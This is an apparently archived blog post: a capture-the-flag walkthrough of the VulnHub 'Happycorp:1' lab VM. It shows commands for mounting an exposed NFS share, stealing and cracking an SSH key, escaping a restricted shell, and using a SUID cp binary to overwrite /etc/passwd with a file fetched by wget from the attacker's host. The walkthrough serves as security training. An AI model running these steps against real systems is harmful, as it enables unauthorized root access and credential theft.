@@ -1,0 +1,97 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Happycorp:1 Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/happycorp1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-06-18T17:17:26+00:00">June 18, 2019</time><time class="updated" datetime="2025-06-10T20:11:37+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">This is another post on vulnhub CTF “named as “HAPPYCORP:1” by Zayotic. It is designed for VMware platform, and it is a boot to root challenge where you have to find flags to finish the task assigned by the author.</span></p>
+<p><span style="color: #000000;">You can download it from here: <a style="color: #000000;" href="https://www.vulnhub.com/entry/happycorp-1,296/">https://www.vulnhub.com/entry/happycorp-1,296/</a></span></p>
+<p><span style="color: #000000;">Penetrating Methodologies</span></p>
+<p><span style="color: #000000;"><strong>Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Netdiscover</span></li>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">NFS-Share</span></li>
+<li><span style="color: #000000;">Mount share directory</span></li>
+<li><span style="color: #000000;">Obtain user.txt -1<sup>st</sup> flag</span></li>
+<li><span style="color: #000000;">Obtain SSH key</span></li>
+<li><span style="color: #000000;">Cracked SSH passphrase (john the ripper)</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Login to SSH</span></li>
+<li><span style="color: #000000;">Break jail (rbash shell)</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation </strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing SUID Binary</span></li>
+<li><span style="color: #000000;">Obtain flag.txt-2<sup>nd</sup> flag</span></li>
+</ul>
+<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
+<p><span style="color: #000000;"><strong>Scanning </strong></span></p>
+<p><span style="color: #000000;">Let’s start with network scanning to identify the IP of VM with the help of netdiscover.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7F57bHTiWf0/XQkZ8GtaoTI/AAAAAAAAe20/toDm6gZ4xDQ5C0TVMbru_XyC20KxInljQCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">So, we have our target IP 192.168.1.104. Now, let’s scan the services and ports via nmap.</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.1.104</pre>
+<p><span style="color: #000000;">We have obtained the fruitful result from the nmap scan, as you can observe so many services are running on the various port. Such as 22: SSH, 80: HTTP and so on.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8ndFhgJOP7w/XQkZ-02a0eI/AAAAAAAAe3U/ujjtK0l09N4kksL1CiS42uMXhI5QAsz4wCLcBGAs/s1600/2.png"/></span></p>
+<h3><span style="color: #000000;"><strong><span style="color: #800000;">Enumeration</span> </strong></span></h3>
+<p><span style="color: #000000;">As we always navigate with HTTP services first, therefore we browse http://192.168.1.104 as the URL but found nothing interesting.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FmCN11c3bLg/XQkZ_oU-j7I/AAAAAAAAe3Y/P3IUG2DNHu0a9Zjaiag5YZEq4JKT8XXqwCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">We found that network share service was also available on <strong><em>port</em></strong> <strong><em>2049</em>,</strong> so we thought to check shared directory in the network. We have therefore installed NFS-client on our local machine and have a command to identify the shared directory available to mount on our local computer.</span></p>
+<pre class="lang:default decode:true">showmount -e 192.168.1.104</pre>
+<p><span style="color: #000000;">we found <em>/home/karl</em> is a shared directory that we can mount in our local machine as given below:</span></p>
+<pre class="lang:default decode:true">mkdir /tmp/raj
+mount 192.168.1.104:/home/karl /tmp/raj
+cd /tmp/raj
+ls -al</pre>
+<p><span style="color: #000000;">As I mount /home/karl in our /tmp/raj directory but I didn’t find anything here, truthfully when I try to open .ssh directory, it gave permission denied error.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Y4-c__c4JLA/XQkZ_iqQ0iI/AAAAAAAAe3c/3_Jy_Oq9_5w7aTXuA0zBZar85CSC__xlQCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">Therefore, I add a user “<strong>aaru</strong>” in the group that has GID of 1001 on my Kali machine and successfully access the .ssh folder as shown in below steps (Same as the approach was used in <a style="color: #000000;" href="https://www.hackingarticles.in/hack-the-lin-security-vm-boot-to-root/">Lin-Security</a>).</span></p>
+<pre class="lang:default decode:true ">groupadd --gid 1001 aaru
+useradd --uid 1001 --group raj aaru</pre>
+<p><span style="color: #000000;">Then access our 1<sup>st</sup> flag i.e. user.txt and moreover copies the id_rsa key in our local machine by executing following command:</span></p>
+<pre class="lang:default decode:true">sudo -u aaru ls -l .ssh
+sudo -u aaru cat .ssh/user.txt
+sudo -u aaru cat .ssh/id_rsa</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DyhIxOhZZ9M/XQkZ_7G4WiI/AAAAAAAAe3g/krtVT_Z8I1wcVNq77yCXu_I9TRv4aMB_gCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">Further, I explored id _rsa.pub and authorized key where I noticed Karl@happycorp and realized that <strong><em>Karl</em></strong> could be the possible username for ssh login. Therefore, I used the id_rsa key for login into ssh as karl but failed to login into it, as it required a passphrase for the key.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JHleje9h-C4/XQkaApNwJhI/AAAAAAAAe3k/Cwj0KgWf20Q-9ELi-jMN6wt83YLFbBPrQCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">Then we have used <a style="color: #000000;" href="https://github.com/truongkma/ctf-tools/blob/master/John/run/ssh2sshng.py">ssh2john</a> to convert this SSH key into a crackable file for John the ripper and further used the rockyou.txt wordlist for johntheripper.</span></p>
+<pre class="lang:default decode:true">python ssh2john key &gt; ssh_login
+john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ovh9isdcegs/XQkZ8S4duqI/AAAAAAAAe28/iGxipYhLXgQnsk8BbdcKxfzo0LTo_GmZwCLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">After obtaining the passphrase “sheep” we changed the permission of RSA key and login as karl but unfortunately, we got access of restricted shell also known rbash as a shell.</span></p>
+<pre class="lang:default decode:true">ssh -i key karl@192.168.1.104</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-czX5JNaFlrY/XQkZ8DQbW6I/AAAAAAAAe24/fKV5zTyBexsFj-iUYMlOll4w9Y42lmOugCLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">Therefore, I tried to access the bash shell directly through ssh by simply typing the following:</span></p>
+<pre class="lang:default decode:true">ssh -i key karl@192.168.1.104 -t "/bin/sh"</pre>
+<p><span style="color: #000000;">Luckily it works and we have successfully access the proper shell.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NdZ5YMG4Q44/XQkZ9QTkbXI/AAAAAAAAe3A/hixklDKBMMYDcqSja_fWZijY59GTWKvIACLcBGAs/s1600/14.1.png"/></span></p>
+<h3><span style="color: #000000;"><strong><span style="color: #800000;">Privilege Escalation</span> </strong></span></h3>
+<p><span style="color: #000000;">Now it’s time to escalate the root privilege and finish this task, therefore with help of find command I look for SUID enabled binaries, where I found SUID bit, is enabled for copy binary (/bin/cp).</span></p>
+<pre class="lang:default decode:true">find / -perm -u=s -type f 2&gt;/dev/null</pre>
+<p><span style="color: #000000;">Hmm!! if suid bit is enabled on /bin/cp then we can copy any system file of root level or can overwrite the existing file.   First, I have explored the /etc /passwd file where karl was end user as shown in the below image and our vision is to edit this file by adding a new user.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-id-WsCoukwI/XQkZ9wTl1xI/AAAAAAAAe3E/MorMIEaDq3QNDyPdndiuNpyeh9Z0v6YYwCLcBGAs/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">On other hands, we have generated a new encrypted password: pass123 using OpenSSL passwd</span></p>
+<pre class="lang:default decode:true">openssl passwd -1 -salt ignite pass123</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zWImfxkKsTY/XQkZ93nMK9I/AAAAAAAAe3I/qjpnETHcSo4m4tFP-LbS0XPVpfmOXrTLQCLcBGAs/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">So, we have copied the whole content of <em>/etc/passwd</em> file in a text editor and then create a new record for user “<strong><em>ignite</em></strong><em>”</em> that owns root level permissions. Saved this file as passwd and further used python server for transferring it into victim’s machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1mz8YMv7-1k/XQkZ-ffr8bI/AAAAAAAAe3M/8H1LX79zlEIRH1JabiH0Dk2J8xcC5kbnQCLcBGAs/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">Inside /tmp folder, we have downloaded our passwd file and with the help of copy command, we have replaced the original /etc/passwd from our file as shown below.</span></p>
+<pre class="lang:default decode:true ">cd /tmp
+wget http://192.168.1.111:8000/passwd
+cp passwd /etc/passwd
+su ignite
+cd root
+cat root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Nz214goLyTg/XQkZ-oaSWKI/AAAAAAAAe3Q/Oua6D4ZSsOEivbGUEOiyXMZE_sDPStzrgCLcBGAs/s1600/17.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
